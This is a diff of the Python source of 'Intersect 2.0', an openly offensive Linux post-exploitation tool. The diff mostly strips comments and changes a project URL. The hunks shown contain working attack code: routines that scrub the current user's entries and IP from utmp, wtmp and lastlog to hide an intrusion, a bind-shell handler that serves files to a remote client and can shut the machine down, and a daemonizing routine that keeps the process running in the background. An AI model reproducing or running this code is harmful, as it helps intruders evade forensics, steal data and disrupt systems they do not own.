@@ -2,7 +2,7 @@
 # intersect 2.0 | created by ohdae
 # email: bindshell[at]live[dot]com
 # twitter: @ohdae
-# http://github.com/ohdae/Intersect-2.0/ || http://bind.shell.la/projects/Intersect
+# http://github.com/ohdae/Intersect-2.0/ || http://bindshell.it.cx/intersect.html
 #
 # To see the full description of Intersect 2.0, view the attached ReadMe file.
 # The ToDo-List will be updated frequently to show changes, upcoming features, bug fixes, etc.
@@ -108,10 +108,8 @@ def environment():
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
 
-   # Setup our signal handler
    signal.signal(signal.SIGINT, signalHandler)
-   
-   # You *might* have to change these: 
+    
    # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
@@ -387,8 +385,7 @@ def FindProtect():
     open('FullList','wb').write(content)
     os.system("rm *.txt")
 
-# Scrub the logfiles (utmp, wtmp & lastlog) for the current user and their ip/host.
-# Remove their entires and write new files. 
+
 def ScrubLog():  
   try:
     Current_User = os.getlogin()
@@ -409,13 +406,6 @@ def ScrubLog():
   print "[+] %s cleaned" % LASTLOG_FILEPATH
 
 
-# This method works both on utmp & wtmp because they have the same struct entries.
-# Once it finds an entry with both the username and ip address (or hostname)
-# it removes it from the new w/utmp file.
-#
-# filePath The fullpath w/filename and extension to read from
-# 
-# returns A new w/utmp binary file
 def scrubFile(filePath, Current_User):
   newUtmp = ""
   with open(filePath, "rb") as f:
@@ -428,15 +418,7 @@ def scrubFile(filePath, Current_User):
   f.close()
   return newUtmp
 
-# This method is specific to the lastlog file binary format, hence the
-# particulat unpack values I had to determine from the C struct. It also
-# counts as it iterates the binary entries until it finds the entry that 
-# matches the to be hidden users' uid.
-#
-# filePath The fullpath w/filename and extension to read from
-# username The user's pid we are searching for
-# 
-# returns A new lastlog binary file
+
 def scrubLastlogFile(filePath, Current_User):
   pw  	     = pwd.getpwnam(Current_User)
   uid	     = pw.pw_uid
@@ -453,15 +435,13 @@ def scrubLastlogFile(filePath, Current_User):
       bytes = f.read(LASTLOG_STRUCT_SIZE)
   return newLastlog
 
-# Writes a binary file.
-#
-# filePath     The fullpath w/filename and extension to read from
-# fileContents The contents to be written to 'filePath'
+
 def writeNewFile(filePath, fileContents):
   f = open(filePath, "w+b")
   f.write(fileContents)
   f.close()
   
+
 def exploitCheck():
     # Shout out to Bernardo Damele for letting me use this code! Thanks again!
     # Check out his blog at http://bernardodamele.blogspot.com
@@ -589,8 +569,8 @@ def bindShell():
                     file_data += data
                     conn.sendall(file_data)
         elif cmd.startswith("rebootsys"):
-             conn.send("[!] Server system is going down for a reboot!")
-             os.system("shutdown -h now")
+            conn.send("[!] Server system is going down for a reboot!")
+            os.system("shutdown -h now")
         elif cmd.startswith('helpme'):
             conn.send(" Intersect TCP Shell | Help Menu \n")
             conn.send("---------------------------------\n")
@@ -614,7 +594,6 @@ def bindShell():
 
 
 def MakeArchive():
-    # Full version features option to send reports over ssh/sftp to a remote host of your choice
     print("[!] Generating report archive....This might take a minute or two..")
     os.chdir(Temp_Dir)
     tar = tarfile.open("reports.tar.gz", "w:gz")
@@ -646,22 +625,18 @@ def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     try: 
         pid = os.fork() 
         if pid > 0:
-            # exits first parent
             sys.exit(0) 
     except OSError, e: 
         print >>sys.stderr, "fork one failed: %d (%s)" % (e.errno, e.strerror) 
         sys.exit(1)
 
-    # decouple from parent environment
     os.chdir("/") 
     os.setsid() 
     os.umask(0) 
 
-    # forks the second parent
     try: 
         pid = os.fork() 
         if pid > 0:
-            # exit from second parent and print PID so user can watch, kill, whatever
             print "Daemon PID %d" % pid 
             sys.exit(0) 
     except OSError, e: 
